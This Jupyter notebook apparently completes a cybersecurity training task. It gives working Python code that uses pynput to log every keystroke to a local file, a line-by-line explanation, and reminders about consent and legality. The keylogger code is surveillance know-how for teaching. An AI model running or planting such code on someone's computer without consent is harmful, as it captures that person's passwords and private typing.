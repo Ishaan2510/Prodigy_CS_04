{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "41d16743-4234-432c-97a0-78620eb8ab91",
   "metadata": {},
   "source": [
    "Task 4: Simple Keylogger\n",
    "\n",
    "Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7f7a257c-8024-4b8f-b8d7-d9d59bcca8f4",
   "metadata": {},
   "source": [
    "Explanation\n",
    "\n",
    "\n",
    "1. Imports:\n",
    "\n",
    "    1. pynput: This library allows controlling and monitoring input devices.\n",
    "    2. logging: This module is used to log messages.\n",
    "\n",
    "\n",
    "2. Logging Configuration:\n",
    "\n",
    "    1. The log_dir variable specifies the directory where the log file will be saved.\n",
    "    2. logging.basicConfig sets up the logging configuration:\n",
    "        1. filename: The name of the log file.\n",
    "        2. level: The logging level (DEBUG captures all events).\n",
    "        3. format: The format of the log messages, including the timestamp and the message.\n",
    "\n",
    "\n",
    "3. Key Press Handler:\n",
    "\n",
    "    1. The on_press function logs each key press.\n",
    "    2. logging.info(str(key)) records the key press event.\n",
    "\n",
    "\n",
    "4. Listener:\n",
    "\n",
    "    1. with Listener(on_press=on_press) as listener: creates a listener for key press events and starts it.\n",
    "    2. listener.join() keeps the listener running.\n",
    "\n",
    "\n",
    "5. Ethical Usage\n",
    "    \n",
    "    1. Always get explicit consent: Before using or distributing a keylogger, ensure you have clear permission from anyone whose keystrokes will be recorded.\n",
    "    \n",
    "    2. Inform about the purpose: Clearly explain why the keylogger is being used and how the data will be managed and protected.\n",
    "\n",
    "    3. Secure the logs: Ensure that the logged data is stored securely to prevent unauthorized access.\n",
    "\n",
    "\n",
    "Important Reminder\n",
    "Ensure that you have permission to log keystrokes on the machine you are using. Unauthorized use of keyloggers is illegal and unethical. Always follow legal and ethical guidelines when using such tools.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79f6c414-d21d-4c4f-aa55-3042eab87b67",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "\n",
    "# Set up logging configuration\n",
    "log_dir = \"\"\n",
    "logging.basicConfig(filename=(log_dir + \"keylog.txt\"), \n",
    "                    level=logging.DEBUG, \n",
    "                    format='%(asctime)s: %(message)s')\n",
    "\n",
    "def on_press(key):\n",
    "    logging.info(str(key))\n",
    "\n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
